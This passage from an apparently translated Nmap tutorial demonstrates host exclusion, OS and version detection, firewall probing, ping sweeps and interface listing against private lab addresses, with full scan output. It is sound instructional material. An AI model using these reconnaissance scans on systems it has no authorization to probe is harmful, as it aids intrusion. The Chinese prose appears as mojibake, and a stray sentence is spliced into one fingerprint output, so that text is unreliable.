seconds</span><br></pre></td></tr></table></figure><h3 id="8-æ’é™¤ä¸€äº›è¿œç¨‹ä¸»æœºåå†æ‰«æâ€“exclude"><a href="#8-æ’é™¤ä¸€äº›è¿œç¨‹ä¸»æœºåå†æ‰«æâ€“exclude" class="headerlink" title="8.æ’é™¤ä¸€äº›è¿œç¨‹ä¸»æœºåå†æ‰«æâ€“exclude"></a>8.æ’é™¤ä¸€äº›è¿œç¨‹ä¸»æœºåå†æ‰«æâ€“exclude</h3><p>åœ¨æ‰§è¡Œå…¨ç½‘æ‰«ææˆ–ç”¨é€šé…ç¬¦æ‰«ææ—¶ä½ å¯ä»¥ä½¿ç”¨â€œâ€“excludeâ€é€‰é¡¹æ¥æ’é™¤æŸäº›ä½ ä¸æƒ³è¦æ‰«æçš„ä¸»æœºã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">16</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">255</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">5.313</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="9-æ‰«ææ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ª-A"><a href="#9-æ‰«ææ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ª-A" class="headerlink" title="9.æ‰«ææ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ª-A"></a>9.æ‰«ææ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ª-A</h3><p>ä½¿ç”¨Nmapï¼Œä½ å¯ä»¥æ£€æµ‹è¿œç¨‹ä¸»æœºä¸Šè¿è¡Œçš„æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ã€‚ä¸ºäº†å¯ç”¨æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬æ£€æµ‹ï¼Œè„šæœ¬æ‰«æå’Œè·¯ç”±è·Ÿè¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨NMAPçš„â€œ<strong>-A</strong>â€œé€‰é¡¹ã€‚</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">A</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">16</span>:<span class="number">25</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52814B66%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.169 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:15 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 22.271 seconds</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„è¾“å‡ºä½ å¯ä»¥çœ‹åˆ°ï¼ŒNmapæ˜¾ç¤ºå‡ºäº†è¿œç¨‹ä¸»æœº<strong>æ“ä½œç³»ç»Ÿçš„TCP</strong> / <strong>IP</strong>åè®®æŒ‡çº¹ï¼Œå¹¶ä¸”æ›´åŠ å…·ä½“çš„æ˜¾ç¤ºå‡ºè¿œç¨‹ä¸»æœºä¸Šçš„ç«¯å£å’ŒæœåŠ¡ã€‚</p><h3 id="10-å¯ç”¨Nmapçš„æ“ä½œç³»ç»Ÿæ¢æµ‹åŠŸèƒ½-O"><a href="#10-å¯ç”¨Nmapçš„æ“ä½œç³»ç»Ÿæ¢æµ‹åŠŸèƒ½-O" class="headerlink" title="10.å¯ç”¨Nmapçš„æ“ä½œç³»ç»Ÿæ¢æµ‹åŠŸèƒ½-O"></a>10.å¯ç”¨Nmapçš„æ“ä½œç³»ç»Ÿæ¢æµ‹åŠŸèƒ½-O</h3><p>ä½¿ç”¨é€‰é¡¹â€œ<strong>-O</strong>â€å’Œâ€œ<strong>-osscan-guess</strong>â€ä¹Ÿå¸®åŠ©æ¢æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯ã€‚</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">O</span> server2.tecmint.com</span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">40</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52815CF4%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">Option</span> -<span class="type">O</span> and -osscan-guess also helps to discover <span class="type">OS</span></span><br><span class="line"><span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.221 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:16 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 11.064 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="11-æ‰«æä¸»æœºä¾¦æµ‹é˜²ç«å¢™-sA"><a href="#11-æ‰«æä¸»æœºä¾¦æµ‹é˜²ç«å¢™-sA" class="headerlink" title="11.æ‰«æä¸»æœºä¾¦æµ‹é˜²ç«å¢™-sA"></a>11.æ‰«æä¸»æœºä¾¦æµ‹é˜²ç«å¢™-sA</h3><p>ä¸‹é¢çš„å‘½ä»¤å°†æ‰«æè¿œç¨‹ä¸»æœºä»¥æ¢æµ‹è¯¥ä¸»æœºæ˜¯å¦ä½¿ç”¨äº†åŒ…è¿‡æ»¤å™¨æˆ–é˜²ç«å¢™ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sA <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">27</span> EST</span><br><span class="line">All <span class="number">1680</span> scanned ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>) are UNfiltered</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.382</span> seconds</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="12-æ‰«æä¸»æœºæ£€æµ‹æ˜¯å¦æœ‰é˜²ç«å¢™ä¿æŠ¤-PN"><a href="#12-æ‰«æä¸»æœºæ£€æµ‹æ˜¯å¦æœ‰é˜²ç«å¢™ä¿æŠ¤-PN" class="headerlink" title="12.æ‰«æä¸»æœºæ£€æµ‹æ˜¯å¦æœ‰é˜²ç«å¢™ä¿æŠ¤-PN"></a>12.æ‰«æä¸»æœºæ£€æµ‹æ˜¯å¦æœ‰é˜²ç«å¢™ä¿æŠ¤-PN</h3><p>æ‰«æä¸»æœºæ£€æµ‹å…¶æ˜¯å¦å—åˆ°æ•°æ®åŒ…è¿‡æ»¤è½¯ä»¶æˆ–é˜²ç«å¢™çš„ä¿æŠ¤ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PN <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">30</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.399</span> seconds</span><br></pre></td></tr></table></figure><h3 id="13-æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº-sP"><a href="#13-æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº-sP" class="headerlink" title="13.æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº-sP"></a>13.æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº-sP</h3><p>ä½¿ç”¨â€œ<strong>-sP</strong>â€é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„æ£€æµ‹ç½‘ç»œä¸­æœ‰å“ªäº›åœ¨çº¿ä¸»æœºï¼Œè¯¥é€‰é¡¹ä¼šè·³è¿‡ç«¯å£æ‰«æå’Œå…¶ä»–ä¸€äº›æ£€æµ‹ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sP <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">01</span> EST</span><br><span class="line">Host server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span>.</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.109</span> seconds</span><br></pre></td></tr></table></figure><h3 id="14-æ‰§è¡Œå¿«é€Ÿæ‰«æ-F"><a href="#14-æ‰§è¡Œå¿«é€Ÿæ‰«æ-F" class="headerlink" title="14.æ‰§è¡Œå¿«é€Ÿæ‰«æ-F"></a>14.æ‰§è¡Œå¿«é€Ÿæ‰«æ-F</h3><p>ä½ å¯ä»¥ä½¿ç”¨â€œ<strong>-F</strong>â€é€‰é¡¹æ‰§è¡Œä¸€æ¬¡å¿«é€Ÿæ‰«æï¼Œä»…æ‰«æåˆ—åœ¨nmap-servicesæ–‡ä»¶ä¸­çš„ç«¯å£è€Œé¿å¼€æ‰€æœ‰å…¶å®ƒçš„ç«¯å£ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -F <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">47</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1234</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.322</span> seconds</span><br></pre></td></tr></table></figure><h3 id="15-æŸ¥çœ‹Nmapçš„ç‰ˆæœ¬"><a href="#15-æŸ¥çœ‹Nmapçš„ç‰ˆæœ¬" class="headerlink" title="15.æŸ¥çœ‹Nmapçš„ç‰ˆæœ¬"></a>15.æŸ¥çœ‹Nmapçš„ç‰ˆæœ¬</h3><p>ä½ å¯ä»¥ä½¿ç”¨â€œ<strong>-V</strong>â€é€‰é¡¹æ¥æ£€æµ‹ä½ æœºå­ä¸ŠNmapçš„ç‰ˆæœ¬ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]<span class="comment"># nmap -V</span></span><br><span class="line"> </span><br><span class="line">Nmap version <span class="number">4.11</span> ( http:<span class="regexp">//</span>www.insecure.org<span class="regexp">/nmap/</span> )</span><br><span class="line">You have new mail <span class="keyword">in</span> <span class="regexp">/var/</span>spool<span class="regexp">/mail/</span>root</span><br></pre></td></tr></table></figure><h3 id="16-é¡ºåºæ‰«æç«¯å£-r"><a href="#16-é¡ºåºæ‰«æç«¯å£-r" class="headerlink" title="16.é¡ºåºæ‰«æç«¯å£-r"></a>16.é¡ºåºæ‰«æç«¯å£-r</h3><p>ä½¿ç”¨â€œ-râ€é€‰é¡¹è¡¨ç¤ºä¸ä¼šéšæœºçš„é€‰æ‹©ç«¯å£æ‰«æã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -r <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">52</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.363</span> seconds</span><br></pre></td></tr></table></figure><h3 id="17-æ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±-iflist"><a href="#17-æ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±-iflist" class="headerlink" title="17.æ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±-iflist"></a>17.æ‰“å°ä¸»æœºæ¥å£å’Œè·¯ç”±-iflist</h3><p>ä½ å¯ä»¥ä½¿ç”¨nmapçš„â€œ<strong>â€“iflist</strong>â€é€‰é¡¹æ£€æµ‹ä¸»æœºæ¥å£å’Œè·¯ç”±ä¿¡æ¯ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap --iflist</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:07 EST</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">****INTERFACES**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line">DEV  (SHORT) IP/MASK          TYPE     UP MAC</span><br><span class="line">lo   (lo)    127.0.0.1/8      loopback up</span><br><span class="line">eth0 (eth0)  192.168.0.100/24 ethernet up 08:00:27:11:C7:89</span><br><span class="line"> </span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">*ROUTES*</span><span class="strong">*****</span><span class="strong">*****</span><span 